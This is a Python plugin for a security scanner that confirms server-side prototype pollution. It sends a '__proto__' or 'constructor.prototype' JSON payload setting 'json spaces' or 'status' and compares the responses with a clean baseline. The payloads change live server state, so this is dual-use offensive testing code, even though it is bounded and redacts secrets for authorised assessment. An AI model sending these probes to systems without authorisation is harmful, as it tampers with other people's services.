"""Fail-closed server-side prototype-pollution confirmation.

The tool performs one bounded, authenticated JSON merge probe using only the
non-destructive ``json spaces`` or ``status`` response-difference oracles.  It
does not expose arbitrary prototype properties, commands, child-process
gadgets, or OOB destinations.  Session material never leaves the tool.  The
backend receives a small typed proof envelope plus bounded, redacted HTTP
transcripts and independently rebuilds the finding.
"""

from __future__ import annotations

import copy
import hashlib
import json
import re
from html import unescape
from typing import Any, Dict, Iterable, Optional, Tuple
from urllib.parse import urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited


ALLOWED_METHODS = {"POST", "PUT", "PATCH"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
ALLOWED_ORACLES = {"json-spaces", "status"}
ALLOWED_VECTORS = {"__proto__", "constructor.prototype"}
MAX_BODY_BYTES = 16_384
MAX_RESPONSE_BYTES = 64_000
MAX_EVIDENCE_EXCERPT_CHARS = 8_000
REDACTED_RUNTIME_SECRET = "<redacted-runtime-secret>"
JSON_SPACES_VALUE = 10
STATUS_VALUE = 555

_SENSITIVE_HEADER_LINE = re.compile(
    r"(?im)^(?:authorization|cookie|set-cookie|proxy-authorization|x-csrf-token)\s*:.*$"
)
_SENSITIVE_JSON_VALUE = re.compile(
    r'(?P<prefix>"[^"\r\n]*(?:csrf|token|session|cookie|authorization|password|secret|api[_-]?key)[^"\r\n]*"\s*:\s*)'
    r'(?P<value>"(?:\\.|[^"\\])*"|[^,}\]\r\n]+)',
    re.I,
)


def _http_url(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        return None
    if parsed.username or parsed.password:
        return None
    return raw


def _same_origin(left: str, right: str) -> bool:
    a, b = urlsplit(left), urlsplit(right)

    def origin(parsed) -> Tuple[str, str, int]:
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        return parsed.scheme.lower(), (parsed.hostname or "").lower(), port

    return origin(a) == origin(b)


def _contains_reserved_key(value: Any) -> bool:
    if isinstance(value, dict):
        for key, child in value.items():
            if str(key) in {"__proto__", "constructor", "prototype"}:
                return True
            if _contains_reserved_key(child):
                return True
    elif isinstance(value, list):
        return any(_contains_reserved_key(item) for item in value)
    return False


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    endpoint = _http_url(parameters.get("endpoint") or parameters.get("target") or parameters.get("url"))
    if not endpoint:
        return False, "endpoint must be a credential-free HTTP(S) URL"

    method = str(parameters.get("method") or "POST").upper()
    if method not in ALLOWED_METHODS:
        return False, "method must be POST, PUT, or PATCH"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"

    oracle = str(parameters.get("oracle") or "").lower()
    if oracle not in ALLOWED_ORACLES:
        return False, "oracle must be json-spaces or status"
    vector = str(parameters.get("vector") or "").lower()
    if vector not in ALLOWED_VECTORS:
        return False, "vector must be __proto__ or constructor.prototype"

    baseline = parameters.get("baselineBody")
    if not isinstance(baseline, dict) or not baseline:
        return False, "baselineBody must be a non-empty JSON object"
    if _contains_reserved_key(baseline):
        return False, "baselineBody must not already contain prototype-path keys"
    try:
        encoded = json.dumps(baseline, ensure_ascii=False, separators=(",", ":"))
    except (TypeError, ValueError):
        return False, "baselineBody must be JSON serializable"
    if len(encoded.encode("utf-8")) > MAX_BODY_BYTES:
        return False, f"baselineBody exceeds {MAX_BODY_BYTES} bytes"

    csrf_source = parameters.get("csrfSourceUrl")
    if csrf_source:
        source = _http_url(csrf_source)
        if not source:
            return False, "csrfSourceUrl must be a credential-free HTTP(S) URL"
        if not _same_origin(endpoint, source):
            return False, "csrfSourceUrl must be same-origin with endpoint"
        if not str(parameters.get("csrfTokenName") or "").strip():
            return False, "csrfTokenName is required with csrfSourceUrl"
        if not str(parameters.get("csrfBodyField") or "").strip():
            return False, "csrfBodyField is required with csrfSourceUrl"

    return True, ""


def build_polluted_body(
    baseline: Dict[str, Any], vector: str, oracle: str
) -> Tuple[Dict[str, Any], str, int]:
    body = copy.deepcopy(baseline)
    if oracle == "json-spaces":
        property_name, value = "json spaces", JSON_SPACES_VALUE
    elif oracle == "status":
        property_name, value = "status", STATUS_VALUE
    else:  # defense in depth; public validation rejects this first
        raise ValueError(f"unsupported oracle: {oracle}")

    if vector == "__proto__":
        body["__proto__"] = {property_name: value}
    elif vector == "constructor.prototype":
        body["constructor"] = {"prototype": {property_name: value}}
    else:
        raise ValueError(f"unsupported vector: {vector}")
    return body, property_name, value


def extract_csrf_token(text: str, token_name: str) -> Optional[str]:
    name = re.escape(str(token_name or "").strip())
    if not name:
        return None

    for tag in re.findall(r"<input\b[^>]*>", text or "", re.I | re.S):
        name_match = re.search(r"\bname\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if not name_match or name_match.group(2) != token_name:
            continue
        value_match = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if value_match:
            return unescape(value_match.group(2))[:512]

    patterns = (
        rf'["\']{name}["\']\s*:\s*["\']([^"\']{{1,512}})["\']',
        rf'\b{name}\b\s*=\s*["\']([^"\']{{1,512}})["\']',
    )
    for pattern in patterns:
        match = re.search(pattern, text or "", re.I)
        if match:
            return unescape(match.group(1))[:512]
    return None


def json_indentation_score(text: str) -> int:
    indents = []
    for line in str(text or "").splitlines()[1:200]:
        stripped = line.lstrip(" ")
        if not stripped or stripped[0] not in {'"', "}"}:
            continue
        indent = len(line) - len(stripped)
        if indent > 0:
            indents.append(indent)
    return min(indents) if indents else 0


def extract_status_values(text: str) -> Tuple[int, ...]:
    values = []
    try:
        parsed = json.loads(text)
    except (TypeError, ValueError):
        parsed = None

    def walk(value: Any) -> None:
        if isinstance(value, dict):
            for key, child in value.items():
                if key in {"status", "statusCode"} and isinstance(child, int):
                    values.append(child)
                walk(child)
        elif isinstance(value, list):
            for child in value[:50]:
                walk(child)

    walk(parsed)
    if not values:
        for match in re.finditer(r'["\'](?:status|statusCode)["\']\s*:\s*(\d{3})', text or ""):
            values.append(int(match.group(1)))
    return tuple(values[:20])


def sanitize_evidence_text(
    text: Any,
    secret_values: Iterable[Any] = (),
    max_chars: int = MAX_EVIDENCE_EXCERPT_CHARS,
) -> str:
    """Redact runtime credentials while preserving response whitespace.

    The json-spaces proof depends on the original indentation, so parsing and
    re-serializing a response would destroy the evidence.  Exact runtime values
    and values under secret-class JSON keys are replaced in place instead.
    """

    sanitized = str(text or "").replace("\0", "")
    secrets = sorted(
        {
            str(value)
            for value in secret_values
            if value is not None and len(str(value)) >= 3
        },
        key=len,
        reverse=True,
    )
    for secret in secrets:
        sanitized = sanitized.replace(secret, REDACTED_RUNTIME_SECRET)
    sanitized = _SENSITIVE_HEADER_LINE.sub(
        lambda match: f"{match.group(0).split(':', 1)[0]}: {REDACTED_RUNTIME_SECRET}",
        sanitized,
    )
    sanitized = _SENSITIVE_JSON_VALUE.sub(
        lambda match: f'{match.group("prefix")}"{REDACTED_RUNTIME_SECRET}"',
        sanitized,
    )
    if len(sanitized) > max_chars:
        return sanitized[:max_chars] + "\n...[evidence excerpt truncated]"
    return sanitized


def build_http_evidence_step(
    label: str,
    request_body: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
) -> Dict[str, Any]:
    raw_response = str(response.get("body") or "").replace("\0", "")
    encoded_response = raw_response.encode("utf-8", errors="replace")
    sanitized_request = sanitize_evidence_text(request_body, secret_values, MAX_BODY_BYTES + 512)
    sanitized_response = sanitize_evidence_text(raw_response, secret_values)
    return {
        "label": label,
        "requestBody": sanitized_request,
        "responseStatus": int(response.get("status") or 0),
        "responseContentType": str(response.get("contentType") or "")[:200],
        "responseBody": sanitized_response,
        "responseBodyLength": len(encoded_response),
        "responseBodySha256": hashlib.sha256(encoded_response).hexdigest(),
        "responseExcerptTruncated": len(raw_response) > MAX_EVIDENCE_EXCERPT_CHARS,
    }


def verify_oracle(oracle: str, baseline: Dict[str, Any], probe: Dict[str, Any]) -> Dict[str, Any]:
    if oracle == "json-spaces":
        before = json_indentation_score(str(baseline.get("body") or ""))
        after = json_indentation_score(str(probe.get("body") or ""))
        delta = after - before
        verified = before <= 2 and after >= JSON_SPACES_VALUE and delta >= 4
        return {
            "verified": verified,
            "baselineIndent": before,
            "probeIndent": after,
            "indentDelta": delta,
            "oracleValue": JSON_SPACES_VALUE,
        }

    if oracle == "status":
        before_values = extract_status_values(str(baseline.get("body") or ""))
        after_values = extract_status_values(str(probe.get("body") or ""))
        verified = STATUS_VALUE not in before_values and STATUS_VALUE in after_values
        return {
            "verified": verified,
            "baselineErrorStatuses": list(before_values[:8]),
            "probeErrorStatuses": list(after_values[:8]),
            "oracleValue": STATUS_VALUE,
        }

    return {"verified": False}


def build_nuclei_finding(endpoint: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    oracle = str(verification.get("oracle") or "response-diff")
    vector = str(verification.get("vector") or "prototype path")
    return {
        "template-id": "xasm-server-side-prototype-pollution-verified",
        "matcher-name": f"prototype-pollution-{oracle}",
        "type": "http",
        "host": endpoint,
        "matched-at": endpoint,
        "info": {
            "name": f"Verified Server-Side Prototype Pollution ({oracle})",
            "severity": "high",
            "description": (
                f"A bounded {vector} JSON merge probe changed the server's {oracle} "
                "response oracle relative to a clean baseline."
            ),
            "remediation": (
                "Reject __proto__, constructor, and prototype keys before recursive merges; "
                "use null-prototype maps or schema-validated copies for untrusted JSON."
            ),
            "classification": {"cwe-id": ["CWE-1321"]},
        },
        "evidence": verification,
    }


class PrototypePollutionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:prototype_pollution_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms server-side prototype pollution on one exact JSON merge endpoint "
            "using only a clean-baseline json-spaces or status oracle. Requires an "
            "explicit aggressive/lab/ctf engagement and unsafe-method opt-in. It never "
            "runs commands, privilege escalation, file access, or OOB exfiltration."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "endpoint": {"type": "string", "description": "Exact JSON merge endpoint"},
                "target": {"type": "string", "description": "Alias for endpoint"},
                "url": {"type": "string", "description": "Alias for endpoint"},
                "method": {"type": "string", "enum": sorted(ALLOWED_METHODS), "default": "POST"},
                "baselineBody": {"type": "object"},
                "vector": {"type": "string", "enum": sorted(ALLOWED_VECTORS)},
                "oracle": {"type": "string", "enum": sorted(ALLOWED_ORACLES)},
                "engagement": {
                    "type": "string",
                    "enum": ["standard", *sorted(ALLOWED_ENGAGEMENTS)],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "csrfSourceUrl": {"type": "string"},
                "csrfTokenName": {"type": "string"},
                "csrfBodyField": {"type": "string"},
                "headers": {"type": "object"},
                "authCookies": {"type": "string", "x-hidden": True},
                "cookie": {"type": "string", "x-hidden": True},
                "authHeaders": {"type": "object", "x-hidden": True},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 60, "default": 20},
            },
            "required": [
                "baselineBody",
                "vector",
                "oracle",
                "engagement",
                "allowUnsafeMethods",
            ],
            "oneOf": [
                {"required": ["endpoint"]},
                {"required": ["target"]},
                {"required": ["url"]},
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web", "api"],
            "input_type": ["url", "json_body"],
            "output_type": ["findings", "prototype_pollution_proof"],
            "taxonomy_domain": ["web", "api"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm server-side prototype pollution with a safe response-diff oracle",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        headers: Dict[str, str],
        body: Optional[str] = None,
    ) -> Dict[str, Any]:
        async with session.request(
            method,
            url,
            headers=headers,
            data=body,
            allow_redirects=False,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "contentType": str(response.headers.get("Content-Type") or "")[:200],
                "truncated": truncated,
            }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        endpoint = str(parameters.get("endpoint") or parameters.get("target") or parameters.get("url"))
        method = str(parameters.get("method") or "POST").upper()
        engagement = str(parameters.get("engagement") or "").lower()
        oracle = str(parameters.get("oracle") or "").lower()
        vector = str(parameters.get("vector") or "").lower()
        timeout = max(3, min(int(parameters.get("timeoutSeconds") or 20), 60))
        baseline_body = copy.deepcopy(parameters["baselineBody"])

        headers: Dict[str, str] = {"Accept": "application/json", "Content-Type": "application/json"}
        for source in (parameters.get("authHeaders"), parameters.get("headers")):
            if isinstance(source, dict):
                for key, value in source.items():
                    if str(key).lower() not in {"host", "content-length", "cookie"}:
                        headers[str(key)] = str(value)
        cookie = parameters.get("authCookies") or parameters.get("cookie")
        if cookie:
            headers["Cookie"] = str(cookie)

        request_count = 0
        csrf_token: Optional[str] = None
        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        try:
            async with aiohttp.ClientSession(timeout=timeout_config) as session:
                csrf_source = parameters.get("csrfSourceUrl")
                if csrf_source:
                    csrf_response = await self._request(session, str(csrf_source), "GET", headers)
                    request_count += 1
                    if csrf_response["status"] >= 400 or csrf_response["truncated"]:
                        raise ValueError("CSRF source could not be read safely")
                    csrf_token = extract_csrf_token(
                        str(csrf_response["body"]), str(parameters.get("csrfTokenName"))
                    )
                    if not csrf_token:
                        raise ValueError("named CSRF token was not found")
                    baseline_body[str(parameters.get("csrfBodyField"))] = csrf_token

                polluted_body, property_name, oracle_value = build_polluted_body(
                    baseline_body, vector, oracle
                )
                baseline_json = json.dumps(baseline_body, ensure_ascii=False, separators=(",", ":"))
                polluted_json = json.dumps(polluted_body, ensure_ascii=False, separators=(",", ":"))

                if oracle == "status":
                    malformed = baseline_json[:-1]
                    baseline_response = await self._request(session, endpoint, method, headers, malformed)
                    request_count += 1
                    mutation_response = await self._request(session, endpoint, method, headers, polluted_json)
                    request_count += 1
                    probe_response = await self._request(session, endpoint, method, headers, malformed)
                    request_count += 1
                    proof_steps = [
                        ("clean-baseline", malformed, baseline_response),
                        ("pollution-mutation", polluted_json, mutation_response),
                        ("post-pollution-proof", malformed, probe_response),
                    ]
                else:
                    baseline_response = await self._request(session, endpoint, method, headers, baseline_json)
                    request_count += 1
                    probe_response = await self._request(session, endpoint, method, headers, polluted_json)
                    request_count += 1
                    proof_steps = [
                        ("clean-baseline", baseline_json, baseline_response),
                        ("pollution-probe", polluted_json, probe_response),
                    ]

                if any(response["truncated"] for _, _, response in proof_steps):
                    raise ValueError("response exceeded the bounded proof limit")
                oracle_proof = verify_oracle(oracle, baseline_response, probe_response)
                http_evidence = {
                    "version": 1,
                    "steps": [
                        build_http_evidence_step(
                            label,
                            request_body,
                            response,
                            (csrf_token,),
                        )
                        for label, request_body, response in proof_steps
                    ],
                }
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": str(exc)[:500],
                "requestCount": request_count,
                "findings": [],
            }

        verification = {
            "verified": oracle_proof.get("verified") is True,
            "fallback": False,
            "mode": "server",
            "endpoint": endpoint,
            "method": method,
            "engagement": engagement,
            "vector": vector,
            "oracle": oracle,
            "property": property_name,
            "oracleValue": oracle_value,
            "requestCount": request_count,
            "authenticated": bool(cookie or parameters.get("authHeaders")),
            "csrfUsed": bool(parameters.get("csrfSourceUrl")),
            "httpEvidence": http_evidence,
            **oracle_proof,
        }
        findings = [build_nuclei_finding(endpoint, verification)] if verification["verified"] else []
        return {
            "success": verification["verified"],
            "fallback": False,
            "target": endpoint,
            "verification": verification,
            "findings": findings,
            "summary": {
                "verified": verification["verified"],
                "oracle": oracle,
                "vector": vector,
                "requestCount": request_count,
                "findingCount": len(findings),
            },
        }


def get_tool() -> PrototypePollutionProbeTool:
    return PrototypePollutionProbeTool()
